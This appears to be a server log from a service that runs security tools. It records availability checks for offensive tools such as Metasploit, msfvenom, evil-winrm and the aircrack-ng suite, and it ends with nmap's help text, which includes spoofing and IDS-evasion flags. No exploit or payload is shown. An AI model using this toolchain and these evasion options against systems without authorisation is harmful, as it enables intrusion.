2025-10-24 01:26:49,503 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43562
2025-10-24 01:26:49,507 - __main__ - INFO - 🧹 CLEANUP: Process 43562 removed from registry
2025-10-24 01:26:49,507 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:49,507 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,507 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,507 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,507 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which have-i-been-pwned
2025-10-24 01:26:49,507 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:49,507 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,507 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,507 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,507 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,507 - __main__ - INFO - 🔍 Cache MISS for command: which metasploit
2025-10-24 01:26:49,507 - __main__ - INFO - 🚀 EXECUTING: which metasploit
2025-10-24 01:26:49,507 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,508 - __main__ - INFO - 🆔 PROCESS: PID 43567 started
2025-10-24 01:26:49,508 - __main__ - INFO - 🆔 REGISTERED: Process 43567 - which metasploit...
2025-10-24 01:26:49,508 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43567
2025-10-24 01:26:49,512 - __main__ - INFO - 🧹 CLEANUP: Process 43567 removed from registry
2025-10-24 01:26:49,512 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:49,512 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,512 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,512 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,512 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which metasploit
2025-10-24 01:26:49,512 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:49,512 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,512 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,512 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,512 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,512 - __main__ - INFO - 💾 Cache HIT for command: which msfconsole
2025-10-24 01:26:49,512 - __main__ - INFO - 💾 Cache HIT for command: which exploit-db
2025-10-24 01:26:49,512 - __main__ - INFO - 💾 Cache HIT for command: which searchsploit
2025-10-24 01:26:49,512 - __main__ - INFO - 🔍 Cache MISS for command: which api-schema-analyzer
2025-10-24 01:26:49,512 - __main__ - INFO - 🚀 EXECUTING: which api-schema-analyzer
2025-10-24 01:26:49,512 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,513 - __main__ - INFO - 🆔 PROCESS: PID 43572 started
2025-10-24 01:26:49,513 - __main__ - INFO - 🆔 REGISTERED: Process 43572 - which api-schema-analyzer...
2025-10-24 01:26:49,513 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43572
2025-10-24 01:26:49,517 - __main__ - INFO - 🧹 CLEANUP: Process 43572 removed from registry
2025-10-24 01:26:49,517 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:49,517 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,517 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,517 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,517 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which api-schema-analyzer
2025-10-24 01:26:49,517 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:49,517 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,518 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,518 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,518 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,518 - __main__ - INFO - 🔍 Cache MISS for command: which postman
2025-10-24 01:26:49,518 - __main__ - INFO - 🚀 EXECUTING: which postman
2025-10-24 01:26:49,518 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,518 - __main__ - INFO - 🆔 PROCESS: PID 43577 started
2025-10-24 01:26:49,518 - __main__ - INFO - 🆔 REGISTERED: Process 43577 - which postman...
2025-10-24 01:26:49,519 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43577
2025-10-24 01:26:49,522 - __main__ - INFO - 🧹 CLEANUP: Process 43577 removed from registry
2025-10-24 01:26:49,522 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:49,522 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,522 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,522 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,522 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which postman
2025-10-24 01:26:49,522 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:49,522 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,522 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,522 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,522 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,522 - __main__ - INFO - 🔍 Cache MISS for command: which insomnia
2025-10-24 01:26:49,522 - __main__ - INFO - 🚀 EXECUTING: which insomnia
2025-10-24 01:26:49,522 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,523 - __main__ - INFO - 🆔 PROCESS: PID 43582 started
2025-10-24 01:26:49,523 - __main__ - INFO - 🆔 REGISTERED: Process 43582 - which insomnia...
2025-10-24 01:26:49,524 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43582
2025-10-24 01:26:49,528 - __main__ - INFO - 🧹 CLEANUP: Process 43582 removed from registry
2025-10-24 01:26:49,528 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:49,528 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,528 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,528 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,528 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which insomnia
2025-10-24 01:26:49,528 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:49,528 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,528 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,528 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,528 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,528 - __main__ - INFO - 💾 Cache HIT for command: which curl
2025-10-24 01:26:49,528 - __main__ - INFO - 💾 Cache HIT for command: which httpie
2025-10-24 01:26:49,528 - __main__ - INFO - 💾 Cache HIT for command: which anew
2025-10-24 01:26:49,528 - __main__ - INFO - 💾 Cache HIT for command: which qsreplace
2025-10-24 01:26:49,528 - __main__ - INFO - 🔍 Cache MISS for command: which uro
2025-10-24 01:26:49,528 - __main__ - INFO - 🚀 EXECUTING: which uro
2025-10-24 01:26:49,528 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,529 - __main__ - INFO - 🆔 PROCESS: PID 43587 started
2025-10-24 01:26:49,529 - __main__ - INFO - 🆔 REGISTERED: Process 43587 - which uro...
2025-10-24 01:26:49,529 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43587
2025-10-24 01:26:49,534 - __main__ - INFO - 🧹 CLEANUP: Process 43587 removed from registry
2025-10-24 01:26:49,534 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:49,534 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,534 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,534 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,534 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which uro
2025-10-24 01:26:49,534 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:49,534 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,534 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,534 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,534 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,534 - __main__ - INFO - 💾 Cache HIT for command: which kismet
2025-10-24 01:26:49,534 - __main__ - INFO - 💾 Cache HIT for command: which wireshark
2025-10-24 01:26:49,534 - __main__ - INFO - 💾 Cache HIT for command: which tshark
2025-10-24 01:26:49,534 - __main__ - INFO - 💾 Cache HIT for command: which tcpdump
2025-10-24 01:26:49,534 - __main__ - INFO - 💾 Cache HIT for command: which smbmap
2025-10-24 01:26:49,534 - __main__ - INFO - 🔍 Cache MISS for command: which sleuthkit
2025-10-24 01:26:49,534 - __main__ - INFO - 🚀 EXECUTING: which sleuthkit
2025-10-24 01:26:49,534 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,534 - __main__ - INFO - 🆔 PROCESS: PID 43592 started
2025-10-24 01:26:49,534 - __main__ - INFO - 🆔 REGISTERED: Process 43592 - which sleuthkit...
2025-10-24 01:26:49,535 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43592
2025-10-24 01:26:49,537 - __main__ - INFO - 🧹 CLEANUP: Process 43592 removed from registry
2025-10-24 01:26:49,537 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:49,537 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,537 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,537 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,537 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which sleuthkit
2025-10-24 01:26:49,537 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:49,537 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,537 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,537 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,537 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,537 - __main__ - INFO - 💾 Cache HIT for command: which autopsy
2025-10-24 01:26:49,537 - __main__ - INFO - 💾 Cache HIT for command: which evil-winrm
2025-10-24 01:26:49,537 - __main__ - INFO - 💾 Cache HIT for command: which paramspider
2025-10-24 01:26:49,537 - __main__ - INFO - 💾 Cache HIT for command: which airmon-ng
2025-10-24 01:26:49,538 - __main__ - INFO - 💾 Cache HIT for command: which airodump-ng
2025-10-24 01:26:49,538 - __main__ - INFO - 💾 Cache HIT for command: which aireplay-ng
2025-10-24 01:26:49,538 - __main__ - INFO - 💾 Cache HIT for command: which aircrack-ng
2025-10-24 01:26:49,538 - __main__ - INFO - 💾 Cache HIT for command: which msfvenom
2025-10-24 01:26:49,538 - __main__ - INFO - 💾 Cache HIT for command: which msfconsole
2025-10-24 01:26:49,538 - __main__ - INFO - 🔍 Cache MISS for command: which graphql-scanner
2025-10-24 01:26:49,538 - __main__ - INFO - 🚀 EXECUTING: which graphql-scanner
2025-10-24 01:26:49,538 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,538 - __main__ - INFO - 🆔 PROCESS: PID 43597 started
2025-10-24 01:26:49,538 - __main__ - INFO - 🆔 REGISTERED: Process 43597 - which graphql-scanner...
2025-10-24 01:26:49,539 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43597
2025-10-24 01:26:49,543 - __main__ - INFO - 🧹 CLEANUP: Process 43597 removed from registry
2025-10-24 01:26:49,543 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:49,543 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,543 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,543 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,543 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which graphql-scanner
2025-10-24 01:26:49,543 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:49,543 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,543 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,543 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,543 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,543 - __main__ - INFO - 🔍 Cache MISS for command: which jwt-analyzer
2025-10-24 01:26:49,543 - __main__ - INFO - 🚀 EXECUTING: which jwt-analyzer
2025-10-24 01:26:49,543 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,543 - __main__ - INFO - 🆔 PROCESS: PID 43602 started
2025-10-24 01:26:49,543 - __main__ - INFO - 🆔 REGISTERED: Process 43602 - which jwt-analyzer...
2025-10-24 01:26:49,544 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43602
2025-10-24 01:26:49,548 - __main__ - INFO - 🧹 CLEANUP: Process 43602 removed from registry
2025-10-24 01:26:49,548 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:49,548 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,548 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,548 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,548 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which jwt-analyzer
2025-10-24 01:26:49,548 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:49,548 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,548 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,548 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,548 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:50,549 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:26:50] "GET /health HTTP/1.1" 200 -
2025-10-24 01:31:02,171 - __main__ - INFO - 🔍 Cache MISS for command: nmap
2025-10-24 01:31:02,171 - __main__ - INFO - 🚀 EXECUTING: nmap
2025-10-24 01:31:02,171 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:31:02,172 - __main__ - INFO - 🆔 PROCESS: PID 43722 started
2025-10-24 01:31:02,172 - __main__ - INFO - 🆔 REGISTERED: Process 43722 - nmap...
2025-10-24 01:31:02,172 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43722
2025-10-24 01:31:02,206 - __main__ - INFO - 📤 STDOUT: Nmap 7.95 ( https://nmap.org )
2025-10-24 01:31:02,206 - __main__ - INFO - 📤 STDOUT: Usage: nmap [Scan Type(s)] [Options] {target specification}
2025-10-24 01:31:02,206 - __main__ - INFO - 📤 STDOUT: TARGET SPECIFICATION:
2025-10-24 01:31:02,206 - __main__ - INFO - 📤 STDOUT: Can pass hostnames, IP addresses, networks, etc.
2025-10-24 01:31:02,206 - __main__ - INFO - 📤 STDOUT: Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
2025-10-24 01:31:02,206 - __main__ - INFO - 📤 STDOUT: -iL <inputfilename>: Input from list of hosts/networks
2025-10-24 01:31:02,206 - __main__ - INFO - 📤 STDOUT: -iR <num hosts>: Choose random targets
2025-10-24 01:31:02,206 - __main__ - INFO - 📤 STDOUT: --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
2025-10-24 01:31:02,206 - __main__ - INFO - 📤 STDOUT: --excludefile <exclude_file>: Exclude list from file
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: HOST DISCOVERY:
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -sL: List Scan - simply list targets to scan
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -sn: Ping Scan - disable port scan
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -Pn: Treat all hosts as online -- skip host discovery
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -PS/PA/PU/PY[portlist]: TCP SYN, TCP ACK, UDP or SCTP discovery to given ports
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -PO[protocol list]: IP Protocol Ping
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --system-dns: Use OS's DNS resolver
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --traceroute: Trace hop path to each host
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: SCAN TECHNIQUES:
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -sU: UDP Scan
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -sN/sF/sX: TCP Null, FIN, and Xmas scans
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --scanflags <flags>: Customize TCP scan flags
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -sI <zombie host[:probeport]>: Idle scan
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -sY/sZ: SCTP INIT/COOKIE-ECHO scans
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -sO: IP protocol scan
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -b <FTP relay host>: FTP bounce scan
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: PORT SPECIFICATION AND SCAN ORDER:
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -p <port ranges>: Only scan specified ports
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --exclude-ports <port ranges>: Exclude the specified ports from scanning
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -F: Fast mode - Scan fewer ports than the default scan
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -r: Scan ports sequentially - don't randomize
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --top-ports <number>: Scan <number> most common ports
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --port-ratio <ratio>: Scan ports more common than <ratio>
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: SERVICE/VERSION DETECTION:
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -sV: Probe open ports to determine service/version info
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --version-light: Limit to most likely probes (intensity 2)
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --version-all: Try every single probe (intensity 9)
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --version-trace: Show detailed version scan activity (for debugging)
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: SCRIPT SCAN:
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -sC: equivalent to --script=default
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --script=<Lua scripts>: <Lua scripts> is a comma separated list of
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: directories, script-files or script-categories
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --script-args-file=filename: provide NSE script args in a file
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --script-trace: Show all data sent and received
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --script-updatedb: Update the script database.
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --script-help=<Lua scripts>: Show help about scripts.
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: <Lua scripts> is a comma-separated list of script-files or
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: script-categories.
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: OS DETECTION:
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -O: Enable OS detection
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --osscan-limit: Limit OS detection to promising targets
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --osscan-guess: Guess OS more aggressively
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: TIMING AND PERFORMANCE:
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: Options which take <time> are in seconds, or append 'ms' (milliseconds),
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -T<0-5>: Set timing template (higher is faster)
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --min-parallelism/max-parallelism <numprobes>: Probe parallelization
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: probe round trip time.
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --max-retries <tries>: Caps number of port scan probe retransmissions.
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --host-timeout <time>: Give up on target after this long
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --scan-delay/--max-scan-delay <time>: Adjust delay between probes
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --min-rate <number>: Send packets no slower than <number> per second
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: --max-rate <number>: Send packets no faster than <number> per second
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: FIREWALL/IDS EVASION AND SPOOFING:
2025-10-24 01:31:02,207 - __main__ - INFO - 📤 STDOUT: -f; --mtu <val>: fragment packets (optionally w/given MTU)
2025-10-24 01:31:02,208 - __main__ - INFO - 📤 STDOUT: -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
2025-10-24 01:31:02,208 - __main__ - INFO - 📤 STDOUT: -S <IP_Address>: Spoof source address
2025-10-24 01:31:02,208 - __main__ - INFO - 📤 STDOUT: -e <iface>: Use specified interface
2025-10-24 01:31:02,208 - __main__ - INFO - 📤 STDOUT: -g/--source-port <portnum>: Use given port number
2025-10-24 01:31:02,208 - __main__ - INFO - 📤 STDOUT: --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies
2025-10-24 01:31:02,208 - __main__ - INFO - 📤 STDOUT: --data <hex string>: Append a custom payload to sent packets
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --data-string <string>: Append a custom ASCII string to sent packets
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --data-length <num>: Append random data to sent packets
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --ip-options <options>: Send packets with specified ip options
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --ttl <val>: Set IP time-to-live field
